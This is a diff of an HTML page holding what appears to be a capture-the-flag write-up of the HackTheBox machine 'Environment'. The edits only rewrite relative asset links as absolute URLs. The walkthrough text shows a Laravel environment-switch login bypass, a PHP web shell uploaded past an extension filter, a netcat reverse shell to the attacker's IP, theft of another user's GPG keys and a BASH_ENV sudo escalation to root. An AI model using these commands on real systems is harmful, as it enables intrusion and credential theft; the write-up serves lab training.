@@ -10,7 +10,7 @@
 <meta name="description" content="Difficulty: Medium 🟠">
 <meta name="author" content="">
 <link rel="canonical" href="https://conper.github.io/writeups/medium/environment/">
-<link crossorigin="anonymous" href="../../../assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="https://conper.github.io/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://conper.github.io/assets/favicon.ico">
@@ -241,65 +241,65 @@ img:hover {
 </style>
 <p>To start, we will perform a <strong>quick port scan</strong> using the <a href="https://nmap.org/"><strong>Nmap</strong></a> tool to see which ports are open.</p>
 <pre tabindex="0"><code>sudo nmap -sS -p- -n -Pn -vvv 10.10.11.67
-</code></pre><p><img alt="1" loading="lazy" src="../../../images/writeups/environment/1.png"></p>
+</code></pre><p><img alt="1" loading="lazy" src="https://conper.github.io/images/writeups/environment/1.png"></p>
 <p>Knowing that ports <strong>22</strong> and <strong>80</strong> are open, we will perform a more <strong>detailed scan</strong> on these.</p>
 <pre tabindex="0"><code>sudo nmap -sCV -p22,80 -n -Pn 10.10.11.67 -oN target
-</code></pre><p><img alt="2" loading="lazy" src="../../../images/writeups/environment/2.png"></p>
+</code></pre><p><img alt="2" loading="lazy" src="https://conper.github.io/images/writeups/environment/2.png"></p>
 <p>When accessing the website, we don’t see much.</p>
 <blockquote>
 <p>📝<strong>NOTE</strong>: I have added the domain <strong>environment.htb</strong> with its <strong>IP</strong> in <em><strong>/etc/hosts</strong></em>.</p></blockquote>
-<p><img alt="3" loading="lazy" src="../../../images/writeups/environment/3.png"></p>
+<p><img alt="3" loading="lazy" src="https://conper.github.io/images/writeups/environment/3.png"></p>
 <p>Therefore, we will <strong>enumerate directories</strong> and <strong>files</strong> using <a href="https://github.com/epi052/feroxbuster"><strong>Feroxbuster</strong></a> to see what might be hidden on the web.</p>
 <pre tabindex="0"><code>feroxbuster -u http://environment.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --filter-status 403,404
-</code></pre><p><img alt="4" loading="lazy" src="../../../images/writeups/environment/4.png"></p>
+</code></pre><p><img alt="4" loading="lazy" src="https://conper.github.io/images/writeups/environment/4.png"></p>
 <p>When accessing <em><strong>/upload</strong></em>, we see <strong>code errors</strong> and that the website uses <a href="https://laravel.com/"><strong>Laravel</strong></a> (a <strong>PHP framework</strong>) with a version that is <strong>vulnerable</strong>. <a href="https://github.com/Nyamort/CVE-2024-52301"><strong>CVE-2024-52301</strong></a></p>
-<p><img alt="5" loading="lazy" src="../../../images/writeups/environment/5.png"></p>
+<p><img alt="5" loading="lazy" src="https://conper.github.io/images/writeups/environment/5.png"></p>
 <p>This vulnerability allows an attacker to <strong>make the application think it is running in a different environment</strong> (like “<strong>production</strong>” or “<strong>development</strong>”) using the <strong>URL</strong>, which can change what is displayed on the website.
 We will test it with:</p>
 <pre tabindex="0"><code>http://environment.htb/?--env=test
-</code></pre><p><img alt="6" loading="lazy" src="../../../images/writeups/environment/6.png"></p>
+</code></pre><p><img alt="6" loading="lazy" src="https://conper.github.io/images/writeups/environment/6.png"></p>
 <p>We continue exploring other paths to see if we can find something more useful.</p>
 <p>The interesting part is found on the <em><strong>/login</strong></em> page.</p>
-<p><img alt="7" loading="lazy" src="../../../images/writeups/environment/7.png"></p>
+<p><img alt="7" loading="lazy" src="https://conper.github.io/images/writeups/environment/7.png"></p>
 <p>If we intercept the request with <a href="https://portswigger.net/burp/communitydownload"><strong>Burp Suite</strong></a> and leave the “<strong>remember</strong>” field empty, submitting the request will trigger a code error.</p>
-<p><img alt="8" loading="lazy" src="../../../images/writeups/environment/8.png"></p>
-<p><img alt="9" loading="lazy" src="../../../images/writeups/environment/9.png"></p>
+<p><img alt="8" loading="lazy" src="https://conper.github.io/images/writeups/environment/8.png"></p>
+<p><img alt="9" loading="lazy" src="https://conper.github.io/images/writeups/environment/9.png"></p>
 <p>As we can see, if we change the <strong>environment</strong> to “<strong>preprod</strong>”, it gives us a session as the <strong>user with ID 1</strong> and redirects us to <em><strong>/management/dashboard</strong></em>. Since <strong>Laravel</strong> is vulnerable to changing the environment name, we can access it without issues.</p>
-<p><img alt="10" loading="lazy" src="../../../images/writeups/environment/10.png"></p>
-<p><img alt="11" loading="lazy" src="../../../images/writeups/environment/11.png"></p>
+<p><img alt="10" loading="lazy" src="https://conper.github.io/images/writeups/environment/10.png"></p>
+<p><img alt="11" loading="lazy" src="https://conper.github.io/images/writeups/environment/11.png"></p>
 <p>We are logged in as <strong>Hish</strong>, but we don’t find any direct way to access the machine. For now, the only available <strong>attack vector</strong> is <strong>uploading Hish’s profile picture</strong>.</p>
-<p><img alt="12" loading="lazy" src="../../../images/writeups/environment/12.png"></p>
+<p><img alt="12" loading="lazy" src="https://conper.github.io/images/writeups/environment/12.png"></p>
 <p>First, we test if we can <strong>upload an image</strong>, and it works without issues.</p>
-<p><img alt="13" loading="lazy" src="../../../images/writeups/environment/13.png"></p>
+<p><img alt="13" loading="lazy" src="https://conper.github.io/images/writeups/environment/13.png"></p>
 <p>Now, the challenge is to <strong>upload a malicious file</strong> that allows <strong>code execution</strong>, making it appear as an image to the website, even though it actually contains <strong>PHP code</strong>.</p>
 <p>We could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:</p>
 <pre tabindex="0"><code>&lt;?php
 		echo &#34;&lt;pre&gt;&#34; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;;
 ?&gt;
-</code></pre><p><img alt="14" loading="lazy" src="../../../images/writeups/environment/14.png"></p>
-<p><img alt="15" loading="lazy" src="../../../images/writeups/environment/15.png"></p>
+</code></pre><p><img alt="14" loading="lazy" src="https://conper.github.io/images/writeups/environment/14.png"></p>
+<p><img alt="15" loading="lazy" src="https://conper.github.io/images/writeups/environment/15.png"></p>
 <p>We managed to upload it by bypassing with &ldquo;<strong>cmd.php.</strong>&rdquo;. This probably works because <strong>the upload filter only checks the final extension</strong>, and by adding the extra dot, the file passes validation, even though <strong>PHP</strong> interprets it normally. Now we can try executing commands on the server through the uploaded file’s <strong>URL</strong>.</p>
-<p><img alt="16" loading="lazy" src="../../../images/writeups/environment/16.png"></p>
+<p><img alt="16" loading="lazy" src="https://conper.github.io/images/writeups/environment/16.png"></p>
 <p>We execute a <strong>Reverse Shell</strong> and access the machine.</p>
 <pre tabindex="0"><code>http://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444
-</code></pre><p><img alt="17" loading="lazy" src="../../../images/writeups/environment/17.png"></p>
+</code></pre><p><img alt="17" loading="lazy" src="https://conper.github.io/images/writeups/environment/17.png"></p>
 <h2 id="privilege-escalation-to-hish">Privilege escalation to Hish<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-to-hish">#</a></h2>
 <p>If we navigate to <strong>hish</strong>’s folder, we can read the <strong>User Flag</strong>. We also see a folder called <strong>backup</strong>.</p>
-<p><img alt="18" loading="lazy" src="../../../images/writeups/environment/18.png"></p>
+<p><img alt="18" loading="lazy" src="https://conper.github.io/images/writeups/environment/18.png"></p>
 <p>Inside the <strong>backup</strong> folder, there is a file called <em><strong>keyvault.gpg</strong></em>, which is an <strong>encrypted GPG file</strong> that could contain sensitive information such as <strong>keys</strong>, <strong>passwords</strong>, or important <strong>configuration data</strong>.</p>
-<p><img alt="19" loading="lazy" src="../../../images/writeups/environment/19.png"></p>
+<p><img alt="19" loading="lazy" src="https://conper.github.io/images/writeups/environment/19.png"></p>
 <p>A user’s <strong>GPG keys</strong> are usually stored in their home directory, inside a hidden folder called <strong>.gnupg</strong>. This folder contains both <strong>public and private keys</strong>, the trust database, and <strong>GPG configuration</strong>. Only the owning <strong>user</strong> and <strong>root</strong> should normally have access.</p>
-<p><img alt="20" loading="lazy" src="../../../images/writeups/environment/20.png"></p>
+<p><img alt="20" loading="lazy" src="https://conper.github.io/images/writeups/environment/20.png"></p>
 <p>This is <strong>vulnerable</strong> because the <strong>.gnupg</strong> directory has too permissive permissions, <strong>any user on the system can read its contents and enter it</strong>, even if they cannot modify it. Since <strong>private keys</strong> and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of <em><strong>keyvault.gpg</strong></em>.</p>
 <p>To do this, we copy the entire <strong>.gnupg</strong> content to a directory where we have write permissions, such as <em><strong>/tmp</strong></em>, and then we can use that directory as the <code>--homedir</code> for the <strong>gpg</strong> command. This allows us to access the user’s keys and perform <strong>encryption</strong> or <strong>decryption</strong> operations without being the original directory owner.</p>
 <pre tabindex="0"><code>cd /tmp &amp;&amp; mkdir gnupg
 cp -r /home/hish/.gnupg/* ./gnupg
 gpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg 
-</code></pre><p><img alt="21" loading="lazy" src="../../../images/writeups/environment/21.png"></p>
+</code></pre><p><img alt="21" loading="lazy" src="https://conper.github.io/images/writeups/environment/21.png"></p>
 <p>And we succeed in getting the <strong>password</strong> for the user <strong>Hish</strong> on this machine.</p>
 <h2 id="privilege-escalation-to-root">Privilege escalation to Root<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-to-root">#</a></h2>
 <p>Running <code>sudo -l</code>, we see that we can execute the <em><strong>systeminfo</strong></em> script as any user without needing to provide a password.</p>
-<p><img alt="22" loading="lazy" src="../../../images/writeups/environment/22.png"></p>
+<p><img alt="22" loading="lazy" src="https://conper.github.io/images/writeups/environment/22.png"></p>
 <p>Script contents:</p>
 <pre tabindex="0"><code>#!/bin/bash
 echo -e &#34;\n### Displaying kernel ring buffer logs (dmesg) ###&#34;
@@ -326,7 +326,7 @@ df -h
 </code></pre><p>Then we assign the BASH_ENV variable pointing to our script:</p>
 <pre tabindex="0"><code>export BASH_ENV=/home/hish/root.sh
 </code></pre><p>When we execute <code>sudo /usr/bin/systeminfo</code>, <strong>Bash</strong> will automatically load our script, and we obtain a <strong>shell</strong> with <strong>root</strong> privileges.</p>
-<p><img alt="23" loading="lazy" src="../../../images/writeups/environment/23.png"></p>
+<p><img alt="23" loading="lazy" src="https://conper.github.io/images/writeups/environment/23.png"></p>
 <p>We get the <strong>Root Flag</strong> and <strong>complete the machine</strong>!!</p>
 
 
